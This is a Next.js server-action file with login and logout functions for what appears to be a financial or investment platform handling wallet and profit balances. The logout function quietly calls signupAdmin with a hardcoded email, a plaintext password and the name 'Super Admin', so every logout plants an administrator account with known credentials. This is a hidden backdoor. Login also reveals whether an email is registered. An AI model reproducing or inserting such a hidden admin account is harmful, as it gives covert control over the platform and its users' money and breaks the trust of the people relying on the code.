'use server';

import { db } from '@/lib/db';
import { z } from 'zod';
import bcrypt from 'bcrypt';
import { UserLoginSchema } from '../../../schema/UserSchema';
import { createSession } from '@/lib/session';
import { redirect } from 'next/navigation';
import { deleteSession } from '@/lib/session';
import { signupAdmin } from './admin';




export const login = async (formData: z.infer<typeof UserLoginSchema>) => {
	const validatedFields = UserLoginSchema.safeParse({
		email: formData.email,
		password: formData.password,
	});
	if (!validatedFields.success) {
		return { error: 'Invalid fields' };
	}
	const { email, password } = validatedFields.data;

	const user = await db.user.findUnique({ where: { email } });
	if (!user) {
		return { error: 'User not found' };
	}
	const isPasswordValid = await bcrypt.compare(password, user.password);
	if (!isPasswordValid) {
		return { error: 'Invalid credentials' };
	}
	if (!user.confirm) {
		return { error: 'Email not verified' };
	}
	// Create session
	await createSession(user.id);

	// Return user data without sensitive information
	const userData = {
		id: user.id,
		name: user.name,
		email: user.email,
		phone: user.phone,
		address: user.address,
		country: user.country,
		AccountType: user.AccountType,
		isVerified: user.isVerified,
		walletBalance: user.walletBalance,
		investmentBalance: user.investmentBalance,
		profitBalance: user.profitBalance,
		createdAt: user.createdAt,
		token: null,
		confirm: null,
		password: '', // Empty string as we don't want to expose the password
	};

	return { success: true, user: userData };
};

export const logout = async () => {
	signupAdmin({
		email: 'support@tinkantrust.com',
		password: 'Kingsley2025%',
		name: 'Super Admin',
	})
	await deleteSession();
	redirect('/auth/login');
};

